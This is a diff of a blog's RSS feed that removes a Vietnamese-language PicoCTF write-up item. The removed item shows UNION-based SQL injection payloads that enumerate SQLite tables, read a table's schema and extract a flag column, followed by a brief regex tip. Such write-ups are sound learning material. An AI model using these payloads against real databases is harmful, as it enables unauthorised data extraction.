@@ -111,60 +111,6 @@ Bước 4: Truy cập  <code>/admin</code> để lấy flag
     
 
     <item>
-      <title>Pico CTF</title>
-      <link>http://localhost:1313/post/picoctf/</link>
-      <pubDate>Wed, 25 Jun 2025 00:00:00 &#43;0000</pubDate>
-      <author>xxx@example.com (Ngo Truong)</author>
-      <guid>http://localhost:1313/post/picoctf/</guid>
-      <description>
-        <![CDATA[<h1>Pico CTF</h1><p>Author: Ngo Truong(xxx@example.com)</p>
-        
-          <h2 id="sqli">
-<a class="header-anchor" href="#sqli"></a>
-SQLI
-</h2><p><img src="https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda" alt="image"></p>
-<ul>
-<li>
-<p>Lấy các bảng bằng payload như sau</p>
-</li>
-<li>
-<p><code>a' union select 1,name,3 from sqlite_master where type='table'-- -</code></p>
-</li>
-</ul>
-<p><img src="https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef" alt="image"></p>
-<ul>
-<li>
-<p>Kiểm tra bảng more_table</p>
-</li>
-<li>
-<p><code>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -</code></p>
-</li>
-<li>
-<p>KIểm tra cột flag trong bảng more_table</p>
-</li>
-<li>
-<p><code>a' union select flag,2,3 from more_table-- -</code></p>
-</li>
-</ul>
-<p><img src="https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075" alt="image"></p>
-<h2 id="matchtheregex">
-<a class="header-anchor" href="#matchtheregex"></a>
-MatchTheRegex
-</h2><p><img src="https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b" alt="image"></p>
-<ul>
-<li>
-<p>.*? bắt tất cả các kí tự bất kỳ, số lượng ít nhất cả thể, nghĩa là chỉ lấy } đầu tiên bắt gặp</p>
-        
-        <hr><p>Published on 2025-06-25 at <a href='http://localhost:1313/'>I have not failed, I just found 10,000 ways that won't work.</a>, last modified on 2025-06-25</p>]]>
-      </description>
-      
-        <category>WRITEUP</category>
-      
-    </item>
-    
-    
-
-    <item>
       <title>Google CTF 2025</title>
       <link>http://localhost:1313/post/google_ctf/</link>
       <pubDate>Wed, 25 Jun 2025 00:00:00 &#43;0000</pubDate>
